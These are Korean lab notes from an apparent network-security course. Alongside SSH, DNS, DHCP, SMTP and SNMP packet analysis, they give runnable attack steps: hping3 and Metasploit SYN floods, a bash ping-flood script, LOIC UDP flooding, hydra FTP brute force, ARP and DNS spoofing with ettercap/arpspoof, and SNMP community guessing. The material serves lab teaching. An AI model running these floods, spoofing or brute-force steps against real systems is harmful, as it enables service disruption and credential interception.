				(리눅스200)
					15.# cd ~/.ssh
					16.# rm -f *
					17.패킷분석!
				(리눅스200)
					18. 와이어샤크 실행
					19. ssh root@192.168.20.50
					20.# pwd
					21.# id
					22.# exit
					23.패킷분석!
					
				ssh만 해서 패킷 저장!
			
			[실습] (public key authentication) 방식
				(리눅스200)
					1. # ssh-keygen -t rsa0
						<ENTER>
						soldesksecurity1.
						soldesksecurity1.
					2. # cd ~/.ssh
					3. # ls
					4. # ssh-copy-id -i id_rsa.pub root@192.168.20.50
				(칼리)
					5. # cd ~/.ssh
					6. # cat authorized_keys
				(리눅스200)
					7. 와이어샤크 실행
					8. # ssh root@192.168.20.50
					9. # pwd
					10.# id
					11.# ls
					12.# exit
					13.패킷 분석!
				
				ssh만 해서 패킷 저장!
			
			차이점 : 처음에 키를 준 2번째 방식은 키전송을 하지 않는다. 2번째가 보안상 유리!
					키를 처음부터 가지고 있기 때문에 키를 알기위해 교환하는 과정이 없어 애초에 뚫릴 이유가없다!
				
		[실습] nslookup 패킷 분석하기 
			사용시스템 : 리눅스200, kns.kornet.net
			실습시나리오 : linux200(nslookup CMD) --> kns.kornet.net(named(53))
			
			[실습] 리눅스200 /etc/resolv.conf	-> 168.126.63.1 만있을때
				1. # nmcli connection show eth0 | grep ipv4
				2. # nmcli connection modify eth0 ipv4.dns 168.126.63.1
				3. # nmcli connection up eth0
				4. # cat /etc/resolv.conf
				5. 와이어샤크 실행(필터 !arp && ip.addr==192.168.20.200, !arp && ip.addr==192.168.20.100)
				6. # nslookup www.seoul.ac.kr
				7. 패킷 분석!					=> 쿼리에 대한 질문과 응답을 확인하기!
				
			[실습] 리눅스200 /etc/resolv.conf	-> 192.168.20.100,168.126.63.1 있을때
				1. # nmcli connection show eth0 | grep ipv4
				2. # nmcli connection modify eth0 ipv4.dns "192.168.20.100,168.126.63.1"
				3. # nmcli connection up eth0
				4. cat /etc/resolv.conf
				5. 와이어샤크 실행
				6. # nslookup www.seoul.ac.kr
				7. 패킷분석!
				
			[실습] DNS 패킷 실습
				환경 : WIN7 이 dns를 192.168.20.200으로한다.(루트DNS 100, 하위DNS 200)
				1. ipconfig /all
				2. ipconfig /flushdns
				3. 와이어샤크 실행 
				4. nslookup -q=A www.test.com
			
		[실습] ping 이 안되는 사이트에 대한 hping3 사용
			ping test
				안되는 사이트 : daum, naver
				잘되는 사이트 : google,facebook
			hping3
				DoS/DDoS 공격
				보안장비(FW, IPS/IDS, UTM, ...) rules test
				Scanning(Host sweep, Port scan)
				etc(네트워크 성능 측정) 
			
			[실습] ping되지 않는 사이트 hping3 사용
				사용법
					hping3 <attack mode> <option> <source ip> <dest. ip> <dest. port> <count> 
				(칼리)
					1. # cat /etc/resolv.conf
					2. # wireshark &
					3. # ping -c 3 www.daum.net
					4. 패킷이 응답없는것 확인!
					5. # hping3 -S www.daum.net -p 80 -c 3
								-S : tcp syn request(TCP Header - TCP Flag - syn) 
								-p : port
								-c : which times you send request 
					6. 패킷이 응답있는걸 확인!
					7. # sysctl -a | grep icmp 에서 1로 설정하면 모든핑을 막을 수 있음 
			
			[실습] hping3 에 대해
				(첫번째) Syn을 200 포트 80에 5번날림
					# hping3 -S 192.168.20.200 -p 80 -c 5
					
				(두번째) Syn을 200 포트 50~54까지 한번씩 날리는것 
					# hping3 -S 192.168.20.200 -p ++50 -c 5 
						-p : port(++50 : 50 ~ 54)
				
				(세번째) ICMP패킷을 5번보낸다 타임스탬프를가지며
					# hping3 -1 192.168.20.200 --icmp-ts -c 5 
						-1		  : use ICMP
						--icmp-ts : request time stemp	
				
				(네번째) 50번~56번 포트까지 열려있는것을확인하는것 
					# hping3 -8 50-56 -S 192.168.20.200
						-8 : scan mode
						-S : tcp syn request
						
				(다섯번째) UDP로 200에 53번포트로 5개보냄 (패킷 loss가 나오는데 목적이 없기 때문에 응답X 따라서 LOSS)
					# hping3 -2 192.168.20.200 -p 53 -c 5 
						-2 : UDP mode
						-p : port
						-c : which times you send request 
				
				(여섯번째) UDP로 200에 69번 포트로 5개를 보낸다 응답이있는데 이는 69번포트가 안열려있어서 이다
					# hping3 -2 192.168.20.200 -p 69 -c 5 
						- 응답은 port unreachable 
				
				(일곱번째) UDP로 200에 80번 포트로 5개 보낸다 포트가열려있는데도 응답이있다 이유는 TCP프로토콜이기때문에 HTTP 가 
					# hping3 -2 192.168.20.200 -p 69 -c 5 
						- 응답은 port unreachable 
						
				(여덟번째) icmp로 출발주소를 192.168.20.200 으로 목적지는 192.168.20.204 으로 3번 응답이 없음 이유는 204가 없어서
					# hping3 -1 -a 192.168.20.200 192.168.20.204 -c 3 
				
				(아홉번째) icmp로 출발주소를 192.168.20.201 으로 목적지는 192.168.20.200 으로 3번
					# hping3 -1  -a 192.168.20.201 192.168.20.200 -c 3 
			
			[실습] DoS/DDoS 에 대해서 
				[실습] ICMP Attack ( ping of death )	칼리->리눅스200,win2008
					1. # hping3 -1 192.168.20.200 --flood -d 65495 	: 출발을 자기로해서 빠르게 65495데이터를 보냄 
					2. 실습에서					  -i u10000 -d 50 옵션씀 
					3. 실습에서					  -i u10000 -d 2000 옵션씀 ( 쪼개져서 보내고 쪼개져서 돌아옴 )
					3. 실습에서				   	  -i u10000 -d 10000 옵션씀 ( 여러개로 쪼개져서 보내고 쪼개셔저 돌아옴 -> icmp에서 한번에 볼수있음 패킷)
					4. # hping3 -1 192.168.20.200 --flood -d 50 	: 65495데이터를 보냄 
					5. # hping3 -1 192.168.20.200 --flood -d 10000 	: 65495데이터를 보냄 
					6. # hping3 -1 192.168.20.200 --flood -d 60000 	: 65495데이터를 보냄 
					
				[실습] ICMP Attack ( ping of death )	윈도우->리눅스200
					1. 리눅스 200에서 # gnome-system-monitor & ->리소스		부하량 보기위해 열음
					2. 윈도우에서 ping -t -l 50 192.168.20.200				50바이트로 조지기
					3. 윈도우에서 ping -t -l 1000 192.168.20.200			1000바이트로 조지기	
					4. 윈도우에서 ping -t -l 10000 192.168.20.200			10000바이트로 조지기
					5. 윈도우에서 ping -t -l 60000 192.168.20.200			60000바이트로 조지기
				
				[실습] ICMP Attack ( ping of death )	리눅스200 -> 윈도우 2008
					1. 윈도우 200 에서 작업관리자 -> 네트워킹 탭
					2. 리눅스에서 ping 192.168.20.201 -s 50				사이즈50으로 보내기
					3. 리눅스에서 ping 192.168.20.201 -s 10000			사이즈10000으로 보내기
					4. 리눅스에서 ping 192.168.20.201 -s 60000			사이즈60000으로 보내기
				
			[실습] ICMP Attach 스크립트 작성
				(칼리설정)
					1. # vi ~/.bashrc 맨 밑에
						export PATH=$PATH:$HOME/bin
						alias aa='chmod 700 /root/bin/*.sh'
					2. # . ~/.bashrc
					3. # echo $PATH
					4. # vi ~/.vimrc
						set ts=4
				
				(프로그램 개발 기능)
					CMD(ping -s 60000 192.168.20.201) X 3개
					프로그램 실행 중간에 <CTRL + C> 누르면 전체 프로그램 종료 
				
					스크립트
						#!/bin/bash
						trap 'pkill ping; exit 1' 2 3 
						if [ $# -ne 2 ] ; then
							echo "Usage : $0 <TargetIP> <AttackNum>"
							exit 1
						fi
						TARGET=$1
						NUM=$2
						Total=0
						trap 'pkill ping.sh' 2
						echo "======== Attack Begine ========"
						echo "Please wait ...."
						for i in $(seq 1 $NUM)
						do
							ping -s 60000 $TARGET > /dev/null 2>&1 &
							echo "[+] Thread Start: $i"
							sleep 5
							Total=$(expr $Total + $(expr 5 \* $i))		(( )) 안에는 마음대로 계산가능 
						done
						for i in $(seq 1 86400)
						do
							echo -ne "Attack Number :$Total \r "
							Total=$(expr $Total + $NUM)
							sleep 1
						done
						sleep 84600
						trap 2 3
					
			[실습] 운영체제 내에서 DoS
			
			[실습] TCP SYN Flooding Attack 
				1. TCP SYN Flooding 공격,방어대책 조사 
					공격원리 
						- TCP 3-way handshake를 이용하는 DoS 공격 방법의 한가지 종류
						- IP Spoofing 공격을 사용하여 Half-Open TCP 연결을 시도하여 타겟 호스트의 Listen Queue 를 고갈시키는 공격
					공격증상
						- 네트워크 부하량이 증가
					공격확인
						- (서버) # netstat -antp
							-> SYN_Received 상태가 많음
					방지대책
						(서버)
							- TCP Syn_cookie 
							- Backlog Queue 늘리기
							- Half-Open Time 시간 줄이기 
							- rp_filter(reverse path filter)
						(네트워크)
							- 보안장비(Anti-DDoS/DDoSWall, IDS/IPS, NG Firewall, Network Device ....)
					
				2. 사용시스템 
					리눅스200->Web Server,칼리->Web attacker,윈2008->Web Client
					[실습] TCP SYN Flooding 실습(웹서버 공격하기)
						(리눅스200)
							웹서버를 기동한다.
							# pgrep -lf httpd 
							# systemctl restart httpd
							# systemctl enable httpd
							웹페이지를 구성한다.
							# cd /var/www/html 
							# mkdir -p test 
							# echo 'Syn Flooding Test Page' > /var/www/html/test/index.html 
							# firefox http://192.168.20.200/test
						(윈2008)
							http://192.168.20.200 		인터넷에서
							http://192.168.20.200/test 
						(칼리)
							# wireshark &	-> eth1 내부망 선택
							# netstat -antp | grep :5432
							안뜬다.
							# systemctl enable postgresql
							# systemctl start postgresql
							# msfconsole
								> show -h		명령어 사용법나옴
								> show auxiliary	코드들이 나온다 
								> use auxiliary/dos/tcp/synflood 	이걸사용한다
								> show options 		옵션 보기 	Current Setting 없으면	Required   예스여도 안됨
								> set RHOST 192.168.20.200 	따라서 RHOST 부분에 이걸채워줌
								> show options
								> run		하면 와이어샤크에 잡힘
							SYN 이 여러번 보내는걸 알 수 있다 IP도 이상한 IP임 
						(윈2008)
							http://192.168.20.200 해서 하면 잘 들어가짐 -> 공격이안됨 -> 자원을 다 소비시키지 못해서 
					
					[실습] hping3 명령어로 SYN Flooding 공격 및 분석
						(칼리)
							# hping3 -S -a 192.168.20.205 192.168.20.200 -p 80 --flood 
						
					[실습] TCP Session Hijacking 
						m.blog.naver.com/sbd38/220232339370
						http://wildpup.cafe24.com/archives/277
		
					[실습] UDP Flooding 공격 
						1. http://sourceforge.net/projects/loic/	loic 설치
						2. dotNetFx40_Full_x86_x64 설치해야함
						3. 공격 웹서버 선택 192.168.20.200
						4. 속성 = udp 속도 그리고 내용 적어서 공격누르기
						5. 해당 작업을 와이어샤크로 분석 
					
6. 응용계층						
	DNS, HTTP/HTTPS, SMTP, FTP, TELNET, SNMP, SSH, CIFS/SAMBA, DHCP, 
	
	1. DHCP	서버:67	클라:68
		DHCP 서버가 제공하는 정보
			기본 정보: IP주소/Netmask, Default Router IP
			추가 정보: 네임서버(DNS)의 IP
			기타 정보: 홈 에이전트 주소, 디폴트 도메인 네임 등
		
		DHCP 동작 원리(RFC 2131, 2132)
			DORA Process(Discover, Offer, Request, Ack)
			DHCP Discover : broadcast
			DHCP Offer	  : unicast
			DHCP Request  : broadcast
			DHCP Ack	  : unicast
		
			---------+-----------------+----------------------
					|					|
					|					|
					DHCP Server      DHCP Client
					dhcpd(67/udp)	 dhclient(68/udp)
	

	
			DHCPServer--------+----------------+----------------------
			dhcpd(67/udp)	  |					|
							  |					|
							Bootp Relay	   DHCP Client
										   dhclient(68/udp)
		
		
		[실습] 패킷 분석
			동작코드(OpCode) 
				패킷이 DHCP 요청인지 DHCP 응답인지를 나타냄1: Dhcp Discover, 2: Dhcp Offer, 3: Dhcp Request4: Dhcp Decline, 5: Dhcp ACK, 6: Dhcp NAK, 7: Dhcp Release8: Dhcp Inform
					(EX: 1: DHCP Discover)

			하드웨어 유형(Hardware Type)
				하드웨어 주소 유형이다.(10MB 이더넷, IEEE 802, ATM 등)
				ARP에서 사용되는 값에 기초함.(EX: 0x01: ethernet)

			하드웨어 길이(Hardware Length)
				하드웨어 주소의 길이(bytes)이다.(EX: 6 : ethernet)

			홉(Hops)
				DHCP 서버를 찾는 데 도움을 주기 위해 중계 에이전트가 사용한다.(EX: Hop count : 0)

			트렌잭션 ID(Transaction ID)
				요청과 응답에 사용되는 난수이다.(EX: 0x696ddc66)

			경과된 초(Seconds Elapsed)
				클라이언트가 맨 처음 DHCP 서버에게 주소를 요청한 이후의 시간(초)이다.(EX: 0초)

			플래그(Flags) 
				DHCP 클라이언트가 수용할 수 있는 트래픽 유형(유니캐스트, 브로드캐스트 등)이다.(EX: 0x0000: unicast)

			클라이언트 IP 주소(Client IP Address)
				클라이언트의 IP 주소(사용자의 IP Address 필드에서 만들어짐)이다.
					(EX: 0.0.0.0)

			사용자 IP 주소(Your IP Address)
				DHCP 서버에서 제공한 IP 주소(궁극적으로 클라이언트 IP 주소 필드 값이 됨)이다.
					(EX: 0.0.0.0)

			서버 IP 주소(Server IP Address)
				DHCP 서버의 IP 주소이다.
					(EX: 0.0.0.0)

			게이트웨이 IP 주소(Gateway IP Address)
				네트워크의 기본 게이트웨이 IP 주소이다.

			클라이언트 하드웨어 주소(Client Hardware Address)
				클라이언트 MAC 주소이다.

			서버 호스트 이름(Server Host Name)
				(선택 사항)서버의 호스트 이름이다.

			부트 파일(Boot File)
				(선택 사항)DHCP에 의해 사용되는 부팅 파일이다.

			옵션
				더 많은 기능을 제공하기 위해 DHCP 패킷의 구조를 확장하는데 사용된다.
			
		[실습] 임대시간(기본임대시간, 최대 임대시간) 확인
			1. edit -> virtual network adapter -> vmnet8 -> dhcp settings -> 기본시간과 최대임대시간을 볼 수 있음
			(리눅스200)
				1. # rpm -qa | grep dhcp
				2. # yum -y install dhcp
				3. # ls 	-> dhcpd.conf
				4. # vi /usr/share/doc/dhcp-4.2.5/dhcpd.conf.example	에서 임대시간 볼 수 있음.
		
		[실습] DHCP 초기화 프로세스 패킷 분석
			1. Discover
				브로드캐스트로 DHCP에 IP정보 달라고 함 
			2. Offer
				클라이언트한테 자신이 있다고 응답
				1번에서 요청한것보단 덜 응답 그리고 아이피를 전해줄때 실제 이 아이피를 쓰지는않음 
			3. Request
				2번에 받은 IP를 사용하겠다고 서버에 알림
				얘는 1번과 다르게 통신을했으므로 옵션부분에 DHCP Server Identifier 가 있음 
			4. ACK
				알았다고 하는것 클라한테 
				
		[실습] DHCP 갱신 분석
			1. Request
				계속 사용하겠다고 알려줌
			2. ACK
				알았다고 함 

				[실습] 임대하기
					netsh show interface brief			이름알아야함 
					ipconfig /renew "로컬 영역 연결"
		
		[실습] DHCP 서버/클라언트 구축과 패킷 분석 실습
			(주의)
				VMware > Edit > Virtual Network Editor > VMnet8 > [ ] dhcp
				-> DHCP 서버가 서로 경쟁하면 안되기 때문에 VMware DHCP Server 기능을 끈다.
			(윈도우2008)
				1. 관리도구 > 서버 관리자 > 역할 > [v] dhcp
					* DNS Domain: example.com
					* IP 대역: 192.168.20.60 ~ 192.168.20.80
					* GW     : 192.168.20.100
				2. 와이어샤크 실행
			(윈7)	
				3. ctrl + esc > ncpa.cpl > IP와 DNS 자동으로 받기 누르기
			(윈도우2008)
				4. 패킷분석! 
			(윈7)
				5. ipconfig /release 하기 반환하는것 
			(윈도우2008)
				6. 패킷 분석!
			(윈7)
				7. ipconfig /renew "로컬 영역 연결"		해당 카드에 대해 IP를 받아오는것 
			(윈도우2008)
				8. 패킷 분석!
			(윈7)
				9. ipconfig /renew "로컬 영역 연결" 	IP가 있는데 다시 받는것 -> 결과로 똑같이 받음
			(윈도우2008)
				10.패킷분석! 2개가잇음 Request와 ACK
			(윈7)
				11.shutdown /t 0 /r	재부팅!!
			(윈도우2008)
				12.패킷분석		DNS inform이 있음 ! 재부팅시 발견됨 클라에서 서버한테 내가 요청한다는 뜻임 
		[복원]
			(윈도우2008)
				DHCP 서비스 중지 serivces.msc	-> dhcp 서비스 중지
			(윈7)
				ip를 다시 192.168.20.202/24		게이트웨이 100	dns 168.126.63.1
				
	2. DHCPv6	: 서버:547 클라:546
		Solicit		: 멀티캐스트
		Advertise	: 유니캐스트
		Request		: 멀티캐스트
		Reply		: 유니캐스트 
		
	3. SMTP
		[실습] mail/mailx 명령어 사용법
			(리눅스200) 메일보내기
				1. # > /var/spool/mail/user01	내용을 날림
				2. # mail user01
					Subject: Hello 1
					testmailfromuser01
					.
				3. # su - user01
				4. $ mail 
				5. > 1
				6. > q
				7. $ exit
			(리눅스200) 메일자세하게 보내기
				1. # mail -v user01		보낼때 여러 명령어를 함께 볼 수 있음
					Subject: hello2
					testmailfrom user01
					.
				2. # mail -u user01		메일 열어보기 
		
		[실습] 메일 패킷 분석 
			시나리오 : A(Client) ----- Mail Server ----- Mail Server ----- B(Client)
								   +
								   +---이부분을 잡음
			
			프로토콜 부분에 SMTP/IMF 가 내용이 들어있는것 
				
			
			시나리오 : A(Client) ----- Mail Server ----- Mail Server ----- B(Client)
								   +				  +
								   +---이부분을 잡음--+
			
			프로토콜 부분에 SMTP/IMF 가 내용이 들어있는것 
			2개 잡아서 2개씩 3핸드쉐이크와 4핸드쉐이크가있음 
			포트번호를 보면 받는사람이 25번 보내는사람이 56694 	따라서 메일서버와 메일서버가 통신할때도 클라이언트 와 서버처럼 동작한다.
			프로토콜 SMTP
			
			시나리오 : A(Client) ----- Mail Server ----- Mail Server ----- B(Client)
													+				   +
													+---이부분을 잡음--+		

			프로토콜 부분에 SMTP/IMF 가 내용이 들어있는것 
			2개 잡아서 2개씩 3핸드쉐이크와 4핸드쉐이크가있음 
			STARTTLS 는 이제부터 나오는건 암호화 한다는것 인증서가 있으면 복구화 가능
			프로토콜 IMAP
		
		[실습] SMTP를 통해 첨부 파일 분석
			사용시스템 : 칼리, 호스트OS
			시나리오 : 칼리(공유:/share) <---mail_*.pcapng ---- host OS
			
			(칼리) Samba 이용한 공유 서비스 기동 및 확인
				1. # systemctl restart smbd
				2. # systemctl enable smbd
				3. # smbclient -L localhost -N
					공유이름 : share
				4. # testparm
					공유이름 : share => path = /share
			(호스트OS)
				1. ctrl + esc -> \\192.168.10.50
				2. share 에 분석파일 넣기 (mail_*.pcapng)
			(칼리)
				1. # cd /share
				2. # wireshark mail_sender_attachment.pcapng &
				3. 패킷 분석 !
				4. 첨부파일이 있어서 내용이 많아서 fragment 되어서 보낸것 
					boundary 가 경게값 데이터 시작값을 알리는것이고 끝나느것을 알리는것 
					SMTP/IMF 에 내용이 다 있음 
						           > Encapsulated multipart part: (image/jpeg) 					-> 이게 첨부파일임 
										> Media Type
											> 우클릭 
												> Export Packet Bytes 
													> 파일이름: /share/newguy.jpg.base64		-> 로 정하기 인코딩방식이 64이기 때문에 이게 중요한것 파일이 다르면 (ex:zip) 해당 명령어로 디코딩해야함 
				5. # file newguy.jpg.base64
					newguy.jpg.base64:             ASCII text, with CRLF line terminators		-> \r\l = CRLF이거는 제거해야함 

				6. # base64 -di newguy.jpg.base64 > newguy.jpg									-> d는 디코딩 i는 가비지데이터 제거 \r\l을 제거						
				7. 
		
		[실습]  base64 인코딩(encoding), 디코딩(decoding) 대해서
			(칼리) -> 문자열
				1. # mkdir -p /test
				2. # cd /test
				3. # rm -rf /test/*
				4. # echo hello world | base64
					aGVsbG8gd29ybGQK		공백도 문자로 바뀜!
				5. # echo aGVsbG8gd29ybGQK | base64 -d
					hello world
			(칼리) -> 파일
				1. # echo hello > output.txt
				2. # base64 output.txt
					aGVsbG8K
				3. # base64 output.txt > output.encoding
				4. # cat output.encoding
					aGVsbG8K
				5. # base64 -di output.encoding
					hello
				6. # base64 -di output.encoding > output.decoding
				7. # cat output.decoding
					hello

	
	4. Brute Force Attack
		취약점 공격
			- 프로토콜 단점 ( EX : TCP Syn Flooding )
			- 프로토콜 버그 ( EX : SSH downgrade Attack)
			- brute force attack
		
		password attack
			password guessing attack : 암호 추측 공격
			default password attack  : 기본 암호 공격
			dictionary attack        : 사전 대입 공격
			brutus attack(brute-force attack): 무작위 대입 공격

		password crack tools
			Local password crack (offline password crack) : John The Ripper
				- 아이디를 알고 같은 로컬에 있어서 공겨이 가능 ( cat /etc/passwd ) 파일을 읽을수 있기 때문에 비밀번호를 대입하는것
				- 모든 운영체제에서 사용할 수 잇음
			Remote password crack(online password crack)  : Hydra
				- 원격에서 공격하는것 

		[실습] Brute Force Attack
			사용시스템 : 칼리, 리눅스200
			사용프로그램 : hydra
			작업시나리오 : 
				(KaliLinux) xhydra ---- remote password crack ----> (linux200) ftp 서버
				
				(리눅스200)
					1. # nmap localhost -p 21		21번이 열려있어야함
					2. # grep user01 /etc/passwd	user01 있는지 확인하는 것 
				(칼리)
					리눅스 200에 user01사용자가 있는것을 알고 nmap으로 21번 포트가 열려있는 것을 확인함 
					1. nmap -F 192.168.20.200		-> F는 빠르게 보기 
					2. # mkdir -p /test 
					3. # cd /test && rm -rf /test/*
					4. # cat > dict.txt
						admin
						admin1
						user01
						test
						test1
					5. # xhydra &	히드라 gui용 툴 
						■ Target 탭
							---------------- Target ----------------
							[ V ] Single Target    	: 192.168.20.200
							Port			: 21
							Protocol			: ftp
							---------------- Output Options --------------
							[ V ] Show Attempts
								
						■ Passwords 탭
							---------------- Username -------------
							[ V ] Username		: user01
							---------------- Password -------------
							[ V ] Password List 	: 파일이름지정(EX: /test/dict.txt)
					6. 와이어 샤크 실행후 5번에서 start하기
					7. 패킷 분석
						파일안에 5개의 내용이 있기 때문에 처음에 5개의SYN으로 시작(5개의 세션)
						아이디 5개 요청 응답 5개
						비밀번호 5개 요청 응답 5개(1개 successful, 4개 login incorrect)
				(리눅스200)
					1. # cat /var/log/secure		에 로그인 실패 기록이 남음
				(칼리)
					1. # ftp 192.168.20.200			잘 됨
				
				[참고] 사전 파일 만드는 방법
					인터넷상에서 받은 사전 파일 : a.txt	
					직접 생성한 사전 파일 : b.txt
					# cat a.txt b.txt | sort -u > c.txt
		
		[실습]  KaliLinux에서 Packet Sniffing 작업하기
			MITM 의 기본
			
			사용시스템 : 칼리(공격자) 리눅스200(ftp서버) win2008(ftp클라)
			사용툴 : ettercap (리눅스 spooing 툴임 이후에 많은 기능이 내장 -G옵션하면 gui방식임)
					 아벨 & 카인? (윈도우 spooing 툴임)
			(칼리)
				1. 와이어샤크 실행
				2. # ettercap -G & 
					Sniff > Unified sniffing > eth1  해서 이더넷 잡기 
					Hosts > Scan fo hosts			 스캔 해보기
					Hosts > Host list				 스캔 한거 가져오기 -> 안나옴 툴에 문제 
				3. Ettercap 0.8.2 Bug Fix			 툴에 버그있음!!
					증상 : Scan for host 실행	-> 주변 호스트 검색 X
					해결 : 밑에 방법 참조 
						(ㄱ)ettercap 0.8.3 (2019.1.1)	=> https://ettercap-project.org 에 오류가 있다고 나와있음 
						(ㄴ)검색 호스트를 파일로 만들어서 load 하여 사용
							# cd
							# nmap -F 192.168.20.200
								-> 192.168.20.200
								-> 192.168.20.201 
									이 둘의 IP와 MAC가 필요함 
							# vi hostlist.txt	에 등록 
								192.168.20.200	00:0c:29:e9:84:bf	linux200
								192.168.20.201	00:0c:29:c4:e5:d6	win2008
				4. # ettercap -G &
					Sniff > Unified sniffing > eth1  해서 이더넷 잡기 
					Hosts > Scan fo hosts			 스캔 해보기
					Hosts > Host list				 스캔 한거 가져오기 -> 안나옴 툴에 문제 
					Hosts > Host from file			 hostlist.txt 
					200 번을 target 1로
					201 번을 target 2로 		
				5. 와이어샤크 실행 
				6. 4번에서 mitm에서 sniff remote connections하기
				7. 와이어샤크 보기 -> 스푸핑작업인것을 확인
			(윈2008)
				1. arp -a	칼리랑 리눅스200 mac같은지 확인
				2. ftp 192.168.20.200		-> 포워딩을 안해서 연결이 안됨 툴에 또 문제가 있어서!
				3. 다시 수동명령어로 전환!
			(칼리)
				1. 와이어샤크 실행
				2. # nmap -F 192.168.20.0/24	주변 서버 검색
				3. # echo 1 > /proc/sys/net/ipv4/ip_forward				포워드 기능 on
				4. # arpspoof -i eth1 -t 192.168.20.200 192.168.20.201	200한테 201의맥정보를 칼리정보를 준다
				5. # arpspoof -i eth1 -t 192.168.20.201 192.168.20.200	201한테 200의맥정보를 칼리정보를 준다
			(윈도우)
				1. ftp 192.168.20.200
					칼리에서 패킷분석하면 다 볼 수 잇음
				2. telnet 192.168.20.200
					칼리에서 패킷분석하면 다 볼 수 잇음
		
		[실습] DNS Spoofing
			동작원리 :
				- 공격자는 같은 로컬에서 ARP 스푸핑으로 일단 클라이언트의 정보를 받을 수 있게 함
				- 공격자는 가짜 WEB 사이트(네이버),가짜 DNS서버 만듬 
				- 클라이언트는 네이버를 요청하기 위해 DNS로 패킷을 보냄 원래 DNS와 공격자의 DNS서버에 2개 요청
				- 같은 로컬에 있는 공격자의 응답이 더 빨라서 가짜 WEB(네이버) 가 나옴 
			
			(칼리)
				ARP Spoofing , Fake WEB, Fake DNS 
					(Fake WEB)
						1. # cd /etc/apache2  		아파치 주설정파일이들어있는곳 주설정 파일이 있어야함 
						2. # cd /var/www/html 		
						3. # vi /var/www/html/index.html 
							<html>
							<center><h1> Fake Web Site </h1></center>
							</html>
						4. # systemctl restart apache2
						5. # systemctl status apache2
						6. # firefox & -> 192.168.20.50	해서 페이크웹사이트보이나 보기
					(Fake DNS, Arp Spoofing) -> ettercap 으로 공격하기 때문에 여기 DNS파일 정보 변경 
						1. # cd /etc/ettercap
						2. # ls
						3. # vi etter.dns 
							###############################################
							# (1) Sfecific Configuration
							# - DNS Spoofing Test
							www.daum.net            A       192.168.20.50			=> 이걸 수정하면 다시 켜야함 # ettercap -G &
							*.daum.net              A       192.168.20.50
							www.daum.net            PTR     192.168.20.50
							
						4. # vi hostlist.txt
							192.168.20.200  00:0c:29:e9:84:bf   linux200
							192.168.20.201  00:0c:29:c4:e5:d6   win2008
							192.168.20.100  00:0c:29:12:a2:6b   firewall

						5. # ettercap -G &
							Sniff > Unified sniffing > eth1  해서 이더넷 잡기 
							Hosts > Scan fo hosts			 스캔 해보기
							Hosts > Host list				 스캔 한거 가져오기 -> 안나옴 툴에 문제 
							Hosts > Host from file			 hostlist.txt 
							100번 target 1
							201번 target 2
							mitm > arp poisoning > Sniff remote connection
								# arpspoof -i eth1 -t 192.168.20.100 192.168.20.201		=> 위에 mitm안하고 이거하고 밑에 dns_spoof만 하고 하면 잘됨
								# arpspoof -i eth1 -t 192.168.20.201 192.168.20.100	
							lugins > Manage the plugins > dns_spoof 더블클릭
							Start > Start sniffing
						6. 와이어샤크실행
						7. 패킷분석!
					(윈도우2008)
						1. ipconfig /flushdns
						2. http;//www.daum.net 하기
						3. 되는사람도 있고 안되는사람도 있다 ettercap 이 arp 리플라이속도가 매우 느리다!
			다른방법 !!
				1. arpspoof -i eth1 -t 192.168.20.100 192.168.20.201
				2. arpspoof -i eth1 -t 192.168.20.201 192.168.20.100
				3. echo "192.168.20.50 www.daum.net" > /daum.txt
				4. dnsspoof -i eth1 -f /daum.txt
	
	5. SNMP (	A(클라)--------------->B(서버)
		동작원리
			1. A 시스템에 SNMP 프로그램 설치 후 해당 모든 것에는 이름이 붙음 ( 메모리 전체공간, 메모리남은공간, 사용량, 폴더,파일 다)
			2. B에서 A에게 GET 해서 요청을 받아와서 그래프에 찍어서 선을 이으면 모니터링을 쉽게 할수 있도록 보여짐 (각 장치별로 보여지게 함)
			3. A가 리눅스던 윈도우던 시스코장비던 처음요청하는 리소스는 같다 따라서 B는 이기종간에 데이터를 쉽게 가져올 수 있다
			4. 이러하게 모니터링을 할 수있게 만든 프로그램을 NMS이다.
		
		명령어 
			GET : Manager -> Agent 매니저가 에이전트한테 정보를 요청
			SET : Manager -> Agent 매니저가 에이전트의 특정값을 설정하기 위해서
			TRAP: Agent -> Manager 에이전트가 매니저한테 해당 상황을 알리기 위해서 사용(오류,추적기능)
		
		버전
			SNMPv1	-> 평문전송
			SNMPv2	-> 
			SNMPv3	-> 갈수록 보안이 쌔 짐 ( 예전에는 평문데이터로 전송했었음 3만써야함 )
			SNMP는 community id 가 보안에 사용되기 때문에 default로 사용하면 안된다.
			
			
		사용
			윈도우에서 snmpd와 
					   snmptrapd를 켜놔야함
		
		구조 
			1. Manager	-> 정보를 수집하는 곳
			2. Agent	-> 각각의 장비에서 매니저에 정보를 보내거나 조치를 요구함
			3. MIB		-> 모든 자원에는 이름이 붙는데 그 이름 붙이는 체계를 MIB라함 하나하나는 OID(오브젝트ID) 라 함
				- 구성관리 : 물리구조 지도화
				- 성능관리 : 통계 데이터 제공 
				- 고장관리 : 문제의 검색 추출 및 해결 제공
				- 보안관리 : 정보 제어 및 보호 기능
				- 계정관리 : 노드별 사용현황 측정
			결국 Network를 관리한다는 것은 관리대상인 장비들의 MIB중에서 특정값을 얻어와서 그 장비의 
			상태를 파악하거나, 그 값을 변경함을 의미하는 것이다.		   
		
		PROTOCOL
			UDP(161,162)
		
		[실습] SNMP 취약점
			사용시스템 : 리눅스200(서버), 칼리(클라)
			
			[실습] 비밀번호 사전대입공격 해보고 정보 체크해보기 !
				(리눅스200)
					1. # rpm -qa | grep snmp 
					2. # yum -y install net-snmp net-snmp-libs net-snmp-utils		설치할때 community string 이 public임  
					3. # systemctl list-unit-files | grep -i snmp
					4. # systemctl enable snmpd
					5. # systemctl start snmpd     
					6. # systemctl enable snmptrapd
					7. # systemctl start snmptrapd
				(칼리)
					1. # nmap -sU -p 161 192.168.20.200 
					2. # wireshark & 
					3. # cd /usr/share/doc/onesixtyone 	onesixtyone 여기에 사전파일이 있음 
					4. # egrep '(public|private)' dict.txt 			퍼블릭이랑 프라이빗 있는지 확인(가장 대중적)
					5. # onesixtyone -c dict.txt 192.168.20.200 	-C파일이름 대상은 200 dict.txt 파일은 기본 벤더들이 사용하는 명령어들이 모여있는것 
					6. 패킷분석!
					7. # snmpwalk -v 1 -c public 192.168.20.200 1.3.6.1.2.1.1.1.0	버전은 1로 커뮤니캐이션은 public로 아이피고 MIB의 이름 
					8. # snmp-check -c public -p 161 192.168.20.200 	정보를 체크하는것 
			
		[실습] SNMP 서버 설정
			사용법 : 
				# snmpwalk -v1 -c public localhost .1			MIB이름 1밑에 다 
				# snmpwalk -v1 -c public localhost system		호스트이름 바꾸기
				# snmptranslate -Tl 							구조 출력 뭐 밑에 뭐밑에 뭐
